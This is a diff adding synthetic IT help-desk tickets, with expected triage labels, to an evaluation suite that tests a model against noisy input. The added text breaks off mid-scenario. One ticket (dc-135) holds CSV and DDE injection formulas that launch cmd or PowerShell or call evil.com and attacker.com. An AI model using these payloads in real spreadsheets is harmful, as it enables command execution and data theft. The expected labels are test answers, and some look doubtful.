@@ -7309,3 +7309,1028 @@ default_registry.register(
         ),
     )
 )
+
+
+# ---------------------------------------------------------------------------
+# dc-131: RTL text with zero-width joiners — Arabic/English mixed
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-131",
+        name="RTL text with zero-width joiners and Arabic/English mix",
+        description=(
+            "Arabic user writes in mixed Arabic and English with zero-width joiners "
+            "scattered through the text, testing noise resilience against bidi content."
+        ),
+        category=_CATEGORY,
+        tags=["rtl_zero_width", "arabic_english", "bidi_content"],
+        ticket=EvalTicket(
+            ticket_id="INC-5131",
+            subject="\u200fVPN \u0645\u0634\u0643\u0644\u0629 - \u200dconnection drops\u200d every 10 min",
+            description=(
+                "\u0645\u0631\u062d\u0628\u0627 IT Support,\n\n"
+                "\u0623\u0646\u0627 \u0641\u064a \u0645\u0643\u062a\u0628 Dubai \u200d(Building 7, 3rd floor)\u200d "
+                "\u0648\u0627\u0644\u200dVPN\u200d \u064a\u0646\u0642\u0637\u0639 \u0643\u0644 10 \u062f\u0642\u0627\u0626\u0642. "
+                "I am using GlobalProtect 6.2.1 on Windows 11 (Dell Latitude 7440).\n\n"
+                "\u0627\u0644\u0645\u0634\u0643\u0644\u0629 \u0628\u062f\u0623\u062a \u0628\u0639\u062f \u062a\u062d\u062f\u064a\u062b "
+                "\u064a\u0648\u0645 \u0627\u0644\u062c\u0645\u0639\u0629. The error code is GP-ERR-4017 and it "
+                "happens during \u200dmarket hours\u200d (09:00-16:00 GST). When the VPN drops "
+                "I lose access to \u200dSharePoint\u200d, \u200dJira\u200d, and the "
+                "\u200dinternal Git\u200d server.\n\n"
+                "\u0634\u0643\u0631\u0627\u064b,\nFatima Al-Rashidi\nTrading Department"
+            ),
+            reporter=_reporter("Fatima Al-Rashidi", "f.alrashidi@contoso.com", "Trading"),
+            created_at="2026-03-18T09:30:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Network & Connectivity",
+            priority="P2",
+            assigned_team="Network Operations",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-132: Unicode normalization mismatch (NFD decomposed characters)
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-132",
+        name="Unicode normalization mismatch in file paths",
+        description=(
+            "File paths contain pre-composed vs decomposed Unicode causing sync failures."
+        ),
+        category=_CATEGORY,
+        tags=["unicode_normalization", "nfd_mismatch", "path_encoding"],
+        ticket=EvalTicket(
+            ticket_id="INC-5132",
+            subject="SharePoint sync failing for accented file names",
+            description=(
+                "Hi IT,\n\n"
+                "SharePoint sync keeps failing for files created by our Paris team. "
+                "The sync log shows errors:\n\n"
+                "  ERROR: Cannot sync 'Rapport_Financier_Re\u0301sume\u0301_Q1.xlsx'\n"
+                "  ERROR: File name mismatch: expected 'Re\u0301sume\u0301' got 'R\u00e9sum\u00e9'\n"
+                "  ERROR: Cannot sync 'Pre\u0301sentation_Mode\u0300le_2026.pptx'\n"
+                "  ERROR: Path encoding conflict in /sites/Finance/Anne\u0301e_2026/\n\n"
+                "Files created on macOS (NFD normalization) vs Windows (NFC). OneDrive "
+                "sync client 24.030.0211.0002. About 200 files are affected.\n\n"
+                "R\u00e9mi Dubois\nFinance"
+            ),
+            reporter=_reporter("R\u00e9mi Dubois", "r.dubois@contoso.com", "Finance"),
+            created_at="2026-03-18T10:15:00Z",
+            channel="portal",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-133: Extreme base64 image flood — multiple inline data URIs
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-133",
+        name="Extreme base64 image flood in email body",
+        description=(
+            "Description contains 3+ large base64-encoded PNG data URIs, "
+            "burying the real issue in a wall of encoded image data."
+        ),
+        category=_CATEGORY,
+        tags=["extreme_base64", "image_flood", "data_uri"],
+        ticket=EvalTicket(
+            ticket_id="INC-5133",
+            subject="Outlook email signature images appear broken",
+            description=(
+                "Hi team,\n\n"
+                "My Outlook signature images are broken since the Exchange update. "
+                "Here are the images:\n\n"
+                "Company logo: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAABk"
+                "CAYAAADDhn8LAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAGU0lEQVR4nO3dX4hcVx3A"
+                "8e+5M3f+7Gy2SbNJE0lTa0xaa2vSWou2VREfBKFQEH3woSD4IPVB9EEQBBEUwQcp"
+                "+KAPgiCIiC+CiF0RFCRt0dY/TU1j0sRtsrvZ3Z3Z2Zl778/z3JnZ2dmku5tk55z7"
+                "+8Bld+/M3Dn3nO+ce+beuQoAAAAAAAAAAAAAAAAA\n\n"
+                "Department badge: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQA"
+                "AABkCAYAAABw4pVUAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAGVKw4bAAAABl"
+                "0RVh0U29mdHdhcmUAZy5pbXBvcnQgaW1hZ2UgYXMgaW1nDQppbXBvcnQgbnVtcHkg"
+                "YXMgbnANCmltcG9ydCBvcw0KaW1wb3J0IHN5cw0KDQojIExvYWQgaW1hZ2UNCmltZy"
+                "A9IGltZy5vcGVuKCdpbnB1dC5wbmcnKQ0K\n\n"
+                "Social media icons: data:image/png;base64,R0lGODlhAQABAIAAAP///wAAACH5"
+                "BAEAAAAALAAAAAABAAEAAAICRAEAOw==iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAY"
+                "AAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\n\n"
+                "The actual issue: my signature in new emails shows broken image icons "
+                "instead of the company logo and social badges. Outlook version "
+                "16.0.18025.20160, Windows 11. Other people in the office are fine.\n\n"
+                "Lisa Yamamoto\nMarketing"
+            ),
+            reporter=_reporter("Lisa Yamamoto", "l.yamamoto@contoso.com", "Marketing"),
+            created_at="2026-03-18T11:00:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-134: Deep MIME boundary nesting (15+ levels)
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-134",
+        name="Deep MIME boundary nesting in forwarded email",
+        description=(
+            "Email forwarded many times with nested MIME boundaries "
+            "creating a deeply nested multipart structure."
+        ),
+        category=_CATEGORY,
+        tags=["deep_mime", "boundary_nesting", "email_parsing"],
+        ticket=EvalTicket(
+            ticket_id="INC-5134",
+            subject="Cannot open email attachments - parsing error",
+            description=(
+                "Content-Type: multipart/mixed; boundary=\"----=_Part_001\"\n"
+                "------=_Part_001\n"
+                "Content-Type: multipart/alternative; boundary=\"----=_Part_002\"\n"
+                "------=_Part_002\n"
+                "Content-Type: multipart/related; boundary=\"----=_Part_003\"\n"
+                "------=_Part_003\n"
+                "Content-Type: multipart/mixed; boundary=\"----=_Part_004\"\n"
+                "------=_Part_004\n"
+                "Content-Type: multipart/alternative; boundary=\"----=_Part_005\"\n"
+                "------=_Part_005\n"
+                "Content-Type: multipart/mixed; boundary=\"----=_Part_006\"\n"
+                "------=_Part_006\n"
+                "Content-Type: multipart/related; boundary=\"----=_Part_007\"\n"
+                "------=_Part_007\n"
+                "Content-Type: multipart/mixed; boundary=\"----=_Part_008\"\n"
+                "------=_Part_008\n"
+                "Content-Type: multipart/mixed; boundary=\"----=_Part_009\"\n"
+                "------=_Part_009\n"
+                "Content-Type: multipart/mixed; boundary=\"----=_Part_010\"\n"
+                "------=_Part_010\n"
+                "Content-Type: text/plain; charset=utf-8\n\n"
+                "ACTUAL ISSUE: I cannot open any email attachments in Outlook. "
+                "Every time I click on a PDF or Excel attachment, Outlook shows "
+                "'The operation failed. An object could not be found.' I think "
+                "the deeply nested forwarding chain has corrupted the MIME "
+                "structure. This email has been forwarded 15+ times between "
+                "departments. Outlook 16.0.18025, Windows 11, Exchange Online.\n\n"
+                "James Patterson\nLegal"
+            ),
+            reporter=_reporter("James Patterson", "j.patterson@contoso.com", "Legal"),
+            created_at="2026-03-18T14:20:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-135: CSV injection formulas in spreadsheet paste
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-135",
+        name="CSV injection formulas in pasted spreadsheet data",
+        description=(
+            "User pasted Excel data containing malicious-looking formulas "
+            "like =HYPERLINK() and =CMD() into the ticket description."
+        ),
+        category=_CATEGORY,
+        tags=["csv_injection", "formula_noise", "spreadsheet_paste"],
+        ticket=EvalTicket(
+            ticket_id="INC-5135",
+            subject="Excel crashes when opening Q1 financial report",
+            description=(
+                "Hi, Excel crashes every time I open the Q1 report. "
+                "Here is sample data from the file:\n\n"
+                "Name\tAmount\tFormula\n"
+                "=HYPERLINK(\"http://evil.com\",\"Revenue\")\t$1,200,000\t=SUM(B2:B10)\n"
+                "=CMD(\"/C calc\")\t$890,000\t=SUM(B3:B11)\n"
+                "+cmd|\'/C notepad\'!A0\t$450,000\t=AVERAGE(B2:B5)\n"
+                "-2+1+cmd|\'/C powershell\'!A0\t$320,000\t=MAX(B2:B8)\n"
+                "@SUM(A1:A10)\t$1,100,000\t=MIN(B2:B8)\n"
+                "=IMPORTXML(\"http://attacker.com/data\",\"//a\")\t$670,000\t=COUNT(B:B)\n\n"
+                "The file is 45MB and contains about 200 sheets. Excel version "
+                "is Microsoft 365 (Build 18025.20160). It crashes with an "
+                "unhandled exception after about 30 seconds of loading.\n\n"
+                "Accounting Team"
+            ),
+            reporter=_reporter("Tom Richards", "t.richards@contoso.com", "Finance"),
+            created_at="2026-03-18T09:45:00Z",
+            channel="portal",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P2",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-136: Zalgo text with combining diacritical marks
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-136",
+        name="Zalgo text with combining diacritical marks",
+        description=(
+            "Parts of the description use Zalgo-style stacked combining marks, "
+            "testing whether the model can parse through visual noise."
+        ),
+        category=_CATEGORY,
+        tags=["zalgo_text", "combining_diacritics", "unicode_heavy"],
+        ticket=EvalTicket(
+            ticket_id="INC-5136",
+            subject="M\u0336\u033a\u0347o\u0337\u0347n\u0336\u034di\u0334\u0353t\u0335\u034do\u0337\u0347r display issues on my desk",
+            description=(
+                "H\u0336\u034di T\u0337\u034de\u0336\u034da\u0335\u034dm,\n\n"
+                "M\u0336\u0353y\u0337\u0347 external monitor (Dell U2722D) is showing "
+                "w\u0336\u034de\u0337\u0353i\u0335\u034dr\u0336\u0347d font rendering. "
+                "Characters appear with s\u0336\u034dt\u0337\u034da\u0335\u0353c\u0336\u0347k\u0337\u034de\u0336\u0353d "
+                "diacritical marks everywhere. The text looks like "
+                "Z\u0335\u034da\u0337\u034dl\u0336\u0353g\u0335\u0347o text on every "
+                "application including Word, Chrome, and Outlook.\n\n"
+                "The issue started after I updated the display driver to version "
+                "31.0.15.4601 (Intel UHD Graphics). My laptop screen shows text "
+                "normally. Only the external monitor is affected. Resolution is "
+                "set to 2560x1440 at 60Hz over USB-C.\n\n"
+                "Rachel Kim\nDesign"
+            ),
+            reporter=_reporter("Rachel Kim", "r.kim@contoso.com", "Design"),
+            created_at="2026-03-18T10:30:00Z",
+            channel="chat",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Hardware & Peripherals",
+            priority="P3",
+            assigned_team="Endpoint Engineering",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-137: Mixed bidi text (Hebrew + English interleaved)
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-137",
+        name="Mixed bidi text — Hebrew and English interleaved",
+        description=(
+            "Hebrew complaint with English technical terms and bidi control characters."
+        ),
+        category=_CATEGORY,
+        tags=["bidi_hebrew", "rtl_control", "mixed_direction"],
+        ticket=EvalTicket(
+            ticket_id="INC-5137",
+            subject="\u200f\u05de\u05d3\u05e4\u05e1\u05ea \u200eLaserJet\u200f \u05dc\u05d0 \u05e2\u05d5\u05d1\u05d3\u05ea",
+            description=(
+                "\u200f\u05e9\u05dc\u05d5\u05dd \u05e6\u05d5\u05d5\u05ea IT,\n\n"
+                "\u200f\u05d4\u05de\u05d3\u05e4\u05e1\u05ea \u200eHP LaserJet Pro M404dn\u200f "
+                "\u05d1\u05e7\u05d5\u05de\u05d4 3, \u05dc\u05d9\u05d3 \u05d7\u05d3\u05e8 "
+                "\u05d4\u05d9\u05e9\u05d9\u05d1\u05d5\u05ea, \u05dc\u05d0 \u05de\u05d3\u05e4\u05d9\u05e1\u05d4 "
+                "\u05db\u05dc\u05dc. \u05db\u05e9\u05d0\u05e0\u05d9 \u05e9\u05d5\u05dc\u05d7 "
+                "\u05e2\u05d1\u05d5\u05d3\u05ea \u05d4\u05d3\u05e4\u05e1\u05d4, \u05d4\u05d9\u05d0 "
+                "\u05e0\u05e9\u05d0\u05e8\u05ea \u200equeue\u200f \u05d5\u05dc\u05d0 "
+                "\u05de\u05d5\u05d3\u05e4\u05e1\u05ea.\n\n"
+                "\u200f\u200e\u05e0\u05d9\u05e1\u05d9\u05ea\u05d9: \u200erestart\u200f, "
+                "\u200eclear queue\u200f, \u200ereinstall driver\u200f. "
+                "\u200f\u200e\u05d4\u05de\u05e1\u05da \u05de\u05e6\u05d9\u05d2 "
+                "\u200eReady\u200f \u05d0\u05d1\u05dc \u05db\u05dc\u05d5\u05dd \u05dc\u05d0 "
+                "\u05de\u05d3\u05e4\u05d9\u05e1.\n\n"
+                "\u200f\u05d3\u05e0\u05d9\u05d0\u05dc \u05dc\u05d5\u05d9\n"
+                "\u200f\u05de\u05d7\u05dc\u05e7\u05ea \u05e2\u05e1\u05e7\u05d9\u05dd"
+            ),
+            reporter=_reporter("Daniel Levi", "d.levi@contoso.com", "Trading"),
+            created_at="2026-03-18T11:15:00Z",
+            channel="portal",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Hardware & Peripherals",
+            priority="P3",
+            assigned_team="Endpoint Engineering",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-138: Jenkins CI pipeline output with ANSI escape codes
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-138",
+        name="Jenkins CI pipeline output with ANSI escape codes",
+        description=(
+            "Full Jenkins build log with ANSI color codes, timestamps, "
+            "and [Pipeline] markers pasted into ticket description."
+        ),
+        category=_CATEGORY,
+        tags=["jenkins_output", "ansi_codes", "ci_pipeline"],
+        ticket=EvalTicket(
+            ticket_id="INC-5138",
+            subject="Deployment pipeline broken since this morning",
+            description=(
+                "The production deployment pipeline is failing. Here is the log:\n\n"
+                "[Pipeline] { (Build)\n"
+                "[2026-03-18T08:15:32.001Z] \x1b[32m[INFO]\x1b[0m Compiling source...\n"
+                "[2026-03-18T08:15:45.123Z] \x1b[32m[INFO]\x1b[0m BUILD SUCCESS\n"
+                "[Pipeline] }\n"
+                "[Pipeline] { (Test)\n"
+                "[2026-03-18T08:16:01.456Z] \x1b[32m[INFO]\x1b[0m Running 847 tests...\n"
+                "[2026-03-18T08:18:22.789Z] \x1b[32m[INFO]\x1b[0m Tests passed: 847/847\n"
+                "[Pipeline] }\n"
+                "[Pipeline] { (Deploy to Production)\n"
+                "[2026-03-18T08:19:01.001Z] \x1b[33m[WARN]\x1b[0m Deploying to prod-east-1...\n"
+                "[2026-03-18T08:19:15.234Z] \x1b[31m[ERROR]\x1b[0m Connection refused: "
+                "prod-deploy-01.contoso.internal:8443\n"
+                "[2026-03-18T08:19:15.235Z] \x1b[31m[ERROR]\x1b[0m java.net.ConnectException: "
+                "Connection refused (Connection refused)\n"
+                "[2026-03-18T08:19:15.236Z] \x1b[31m[ERROR]\x1b[0m \tat "
+                "sun.nio.ch.Net.connect0(Native Method)\n"
+                "[2026-03-18T08:19:30.001Z] \x1b[31m[FATAL]\x1b[0m Deploy failed after 3 retries\n"
+                "[Pipeline] }\n\n"
+                "The build and test stages pass but the deploy stage can't reach "
+                "the production deployment server. This started after the weekend "
+                "maintenance. Jenkins version 2.426.3 LTS.\n\n"
+                "Carlos Mendez\nDevOps"
+            ),
+            reporter=_reporter("Carlos Mendez", "c.mendez@contoso.com", "DevOps"),
+            created_at="2026-03-18T08:30:00Z",
+            channel="chat",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P2",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-139: Terraform plan output (large diff)
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-139",
+        name="Terraform plan output — infrastructure provisioning failure",
+        description=(
+            "User pasted large Terraform plan output with resource changes."
+        ),
+        category=_CATEGORY,
+        tags=["terraform_plan", "iac_diff", "infrastructure"],
+        ticket=EvalTicket(
+            ticket_id="INC-5139",
+            subject="Azure infrastructure provisioning failed - Terraform error",
+            description=(
+                "Terraform plan is failing. Here is the output:\n\n"
+                "Terraform v1.7.4\n"
+                "Initializing provider plugins...\n"
+                "Planning...\n\n"
+                "  # azurerm_resource_group.main will be created\n"
+                "  + resource \"azurerm_resource_group\" \"main\" {\n"
+                "      + id       = (known after apply)\n"
+                "      + location = \"eastus2\"\n"
+                "      + name     = \"rg-contoso-prod-eastus2\"\n"
+                "    }\n\n"
+                "  # azurerm_kubernetes_cluster.aks will be updated in-place\n"
+                "  ~ resource \"azurerm_kubernetes_cluster\" \"aks\" {\n"
+                "      ~ default_node_pool {\n"
+                "          ~ vm_size    = \"Standard_D4s_v3\" -> \"Standard_D8s_v3\"\n"
+                "          ~ node_count = 3 -> 5\n"
+                "        }\n"
+                "    }\n\n"
+                "  # azurerm_sql_server.main will be destroyed\n"
+                "  - resource \"azurerm_sql_server\" \"main\" {\n"
+                "      - name     = \"sql-contoso-prod\" -> null\n"
+                "      - location = \"eastus2\" -> null\n"
+                "    }\n\n"
+                "Error: creating AKS Cluster: unexpected status 403 Forbidden\n"
+                "  Subscription quota exceeded for Standard_D8s_v3 in eastus2.\n\n"
+                "Plan: 1 to add, 1 to change, 1 to destroy. FAILED.\n\n"
+                "We need the AKS node pool scaled up urgently for the new trading "
+                "platform deployment.\n\nSara Chen\nCloud Infrastructure"
+            ),
+            reporter=_reporter("Sara Chen", "s.chen@contoso.com", "Cloud Infrastructure"),
+            created_at="2026-03-18T09:00:00Z",
+            channel="chat",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Data & Storage",
+            priority="P2",
+            assigned_team="Data Platform",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-140: GraphQL introspection response paste
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-140",
+        name="GraphQL introspection response paste",
+        description=(
+            "User pasted a full GraphQL __schema introspection JSON response."
+        ),
+        category=_CATEGORY,
+        tags=["graphql_dump", "api_noise", "json_schema"],
+        ticket=EvalTicket(
+            ticket_id="INC-5140",
+            subject="API gateway returning 500 errors for GraphQL queries",
+            description=(
+                "The GraphQL API gateway is returning 500 errors. "
+                "Here is the introspection response we get:\n\n"
+                '{"data":{"__schema":{"queryType":{"name":"Query"},'
+                '"mutationType":{"name":"Mutation"},"subscriptionType":null,'
+                '"types":[{"kind":"OBJECT","name":"Query","fields":'
+                '[{"name":"users","args":[{"name":"limit","type":{"kind":"SCALAR",'
+                '"name":"Int"}},{"name":"offset","type":{"kind":"SCALAR","name":"Int"}}],'
+                '"type":{"kind":"LIST","ofType":{"kind":"OBJECT","name":"User"}}},'
+                '{"name":"transactions","args":[{"name":"accountId","type":'
+                '{"kind":"NON_NULL","ofType":{"kind":"SCALAR","name":"ID"}}}],'
+                '"type":{"kind":"LIST","ofType":{"kind":"OBJECT","name":"Transaction"}}}],'
+                '"interfaces":[]},'
+                '{"kind":"OBJECT","name":"User","fields":'
+                '[{"name":"id","type":{"kind":"SCALAR","name":"ID"}},'
+                '{"name":"email","type":{"kind":"SCALAR","name":"String"}}]},'
+                '{"kind":"OBJECT","name":"Transaction","fields":'
+                '[{"name":"id","type":{"kind":"SCALAR","name":"ID"}},'
+                '{"name":"amount","type":{"kind":"SCALAR","name":"Float"}}]}]}}}\n\n'
+                "The introspection works but actual queries fail with 500. "
+                "This affects the client-facing portfolio dashboard.\n\n"
+                "Mark Sullivan\nBackend Engineering"
+            ),
+            reporter=_reporter("Mark Sullivan", "m.sullivan@contoso.com", "Backend Engineering"),
+            created_at="2026-03-18T10:00:00Z",
+            channel="portal",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P2",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-141: PGP-signed email with armor blocks
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-141",
+        name="PGP-signed email with armor blocks",
+        description=(
+            "Message wrapped in PGP SIGNED MESSAGE armor blocks."
+        ),
+        category=_CATEGORY,
+        tags=["pgp_armor", "signed_email", "encryption_artifact"],
+        ticket=EvalTicket(
+            ticket_id="INC-5141",
+            subject="PGP email encryption not working for external partners",
+            description=(
+                "-----BEGIN PGP SIGNED MESSAGE-----\n"
+                "Hash: SHA256\n\n"
+                "Hi IT Security team,\n\n"
+                "Our PGP email encryption has stopped working for external partner "
+                "communications. When I try to send encrypted emails to our banking "
+                "partners at Goldman and JPMorgan, Outlook throws error 'PGP key "
+                "not found for recipient'. Our internal PGP keys expired on March "
+                "15th and haven't been renewed.\n\n"
+                "This is blocking the daily settlement report exchange which is "
+                "required by our compliance agreements (FINRA Rule 4370).\n\n"
+                "Key details:\n"
+                "- PGP Desktop version: 11.4.0\n"
+                "- Key server: keys.contoso.com:11371\n"
+                "- Affected users: entire Settlements team (12 people)\n"
+                "- Last working: March 14, 2026\n\n"
+                "Victoria Osei\nSettlements\n\n"
+                "-----BEGIN PGP SIGNATURE-----\n"
+                "Version: GnuPG v2\n\n"
+                "iQEcBAEBCAAGBQJmF5AAAAoJEPZSN2w7C+Vx\n"
+                "K8cAoJH7d8D0w8sMxY2YdN0nFgW6E5GpA2AH\n"
+                "=jk4R\n"
+                "-----END PGP SIGNATURE-----"
+            ),
+            reporter=_reporter("Victoria Osei", "v.osei@contoso.com", "Settlements"),
+            created_at="2026-03-18T07:30:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Security & Compliance",
+            priority="P2",
+            assigned_team="Security Operations",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-142: Teams/Slack chat transcript with reactions and emoji
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-142",
+        name="Teams/Slack chat transcript with reactions",
+        description=(
+            "Copy-pasted chat conversation with emoji reactions, "
+            "@mentions, and thread timestamps."
+        ),
+        category=_CATEGORY,
+        tags=["chat_reactions", "emoji_transcript", "teams_paste"],
+        ticket=EvalTicket(
+            ticket_id="INC-5142",
+            subject="Teams not loading channels - copying chat here",
+            description=(
+                "Teams is broken so I am pasting our team chat here:\n\n"
+                "[09:14] @jennifer.wu: Hey has anyone else\'s Teams stopped loading? \U0001f914\n"
+                "[09:14] @mark.torres: Same here \U0001f44e Channels won\'t load\n"
+                "[09:15] @jennifer.wu: \U0001f44d\U0001f44d\U0001f44d\n"
+                "[09:15] @sarah.patel: +1, getting \'Something went wrong\' error \U0001f62d\n"
+                "   \U0001f44d 7  \u2764\ufe0f 3  \U0001f62e 2\n"
+                "[09:16] @mark.torres: I cleared cache (AppData/Microsoft/Teams) "
+                "and it still doesn\'t work\n"
+                "[09:17] @jennifer.wu: Same, tried reinstalling too \U0001f937\u200d\u2640\ufe0f\n"
+                "[09:18] @sarah.patel: The web version teams.microsoft.com works "
+                "fine though \U0001f914\n"
+                "   \U0001f4a1 4\n"
+                "[09:19] @mark.torres: @IT-Support can someone look at this? "
+                "Desktop app broken for whole floor \U0001f6a8\n\n"
+                "So the Teams desktop app is broken for at least 3 of us on "
+                "Floor 5. Web version works. Desktop version 24316.1305.3092.9039.\n\n"
+                "Jennifer Wu\nProduct Management"
+            ),
+            reporter=_reporter("Jennifer Wu", "j.wu@contoso.com", "Product Management"),
+            created_at="2026-03-18T09:25:00Z",
+            channel="chat",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-143: Windows Event Viewer XML export
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-143",
+        name="Windows Event Viewer XML export — BSOD crashes",
+        description=(
+            "Raw XML from Windows Event Viewer pasted into ticket description."
+        ),
+        category=_CATEGORY,
+        tags=["event_xml", "bsod_dump", "windows_crash"],
+        ticket=EvalTicket(
+            ticket_id="INC-5143",
+            subject="Laptop blue screens multiple times per day",
+            description=(
+                "My laptop keeps crashing with BSOD. Here are the Event Viewer logs:\n\n"
+                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n"
+                "  <System>\n"
+                "    <Provider Name=\"Microsoft-Windows-WER-SystemErrorReporting\"/>\n"
+                "    <EventID>1001</EventID>\n"
+                "    <Level>2</Level>\n"
+                "    <TimeCreated SystemTime=\"2026-03-18T06:32:15.000Z\"/>\n"
+                "    <Computer>WS-CONTOSO-4521</Computer>\n"
+                "  </System>\n"
+                "  <EventData>\n"
+                "    <Data Name=\"BugCheckCode\">0x0000003B</Data>\n"
+                "    <Data Name=\"BugCheckParameter1\">0x00000000c0000005</Data>\n"
+                "    <Data Name=\"BugCheckParameter2\">0xfffff80742a61234</Data>\n"
+                "    <Data Name=\"DumpFileSize\">1073741824</Data>\n"
+                "    <Data Name=\"FaultModule\">ntoskrnl.exe</Data>\n"
+                "    <Data Name=\"FaultModuleVersion\">10.0.22631.3296</Data>\n"
+                "  </EventData>\n"
+                "</Event>\n\n"
+                "BugCheck 0x3B: SYSTEM_SERVICE_EXCEPTION in ntoskrnl.exe. Happens "
+                "3-4 times daily since March 15. Dell Latitude 5540, Windows 11 "
+                "23H2, 16GB RAM. The minidump files are in C:\\Windows\\Minidump.\n\n"
+                "Robert Nguyen\nEngineering"
+            ),
+            reporter=_reporter("Robert Nguyen", "r.nguyen@contoso.com", "Engineering"),
+            created_at="2026-03-18T07:00:00Z",
+            channel="portal",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Hardware & Peripherals",
+            priority="P1",
+            assigned_team="Endpoint Engineering",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-144: Docker compose + container log interleaved
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-144",
+        name="Docker compose YAML + container logs interleaved",
+        description=(
+            "Docker compose file mixed with docker logs output from failing containers."
+        ),
+        category=_CATEGORY,
+        tags=["docker_interleaved", "compose_logs", "container_debug"],
+        ticket=EvalTicket(
+            ticket_id="INC-5144",
+            subject="Microservice failing health checks in production",
+            description=(
+                "The order-processing service keeps failing. Here is our compose "
+                "and the logs:\n\n"
+                "# docker-compose.yml\n"
+                "version: \'3.8\'\n"
+                "services:\n"
+                "  order-processor:\n"
+                "    image: contoso.azurecr.io/order-processor:3.2.1\n"
+                "    ports:\n"
+                "      - \'8080:8080\'\n"
+                "    healthcheck:\n"
+                "      test: [\'CMD\', \'curl\', \'-f\', \'http://localhost:8080/health\']\n"
+                "      interval: 30s\n"
+                "      retries: 3\n\n"
+                "$ docker logs order-processor --tail 20\n"
+                "2026-03-18T08:00:01Z INFO  Starting order-processor v3.2.1\n"
+                "2026-03-18T08:00:02Z INFO  Connecting to Redis at redis-prod:6379...\n"
+                "2026-03-18T08:00:05Z ERROR Connection refused: redis-prod:6379\n"
+                "2026-03-18T08:00:05Z FATAL Cannot connect to message broker\n"
+                "2026-03-18T08:00:05Z INFO  Health check endpoint returning 503\n"
+                "2026-03-18T08:00:35Z WARN  Container unhealthy after 3 retries\n\n"
+                "The Redis instance seems to be down. This is blocking all order "
+                "processing.\n\nAlex Rivera\nBackend Engineering"
+            ),
+            reporter=_reporter("Alex Rivera", "a.rivera@contoso.com", "Backend Engineering"),
+            created_at="2026-03-18T08:10:00Z",
+            channel="chat",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P2",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-145: S/MIME encrypted email body artifact
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-145",
+        name="S/MIME encrypted email body artifact",
+        description=(
+            "Ticket body contains S/MIME ContentType headers and base64 encrypted blocks."
+        ),
+        category=_CATEGORY,
+        tags=["smime_body", "encrypted_artifact", "email_security"],
+        ticket=EvalTicket(
+            ticket_id="INC-5145",
+            subject="Cannot read encrypted emails from compliance team",
+            description=(
+                "Content-Type: application/pkcs7-mime;\n"
+                "  smime-type=enveloped-data;\n"
+                "  name=\"smime.p7m\"\n"
+                "Content-Transfer-Encoding: base64\n"
+                "Content-Disposition: attachment;\n"
+                "  filename=\"smime.p7m\"\n\n"
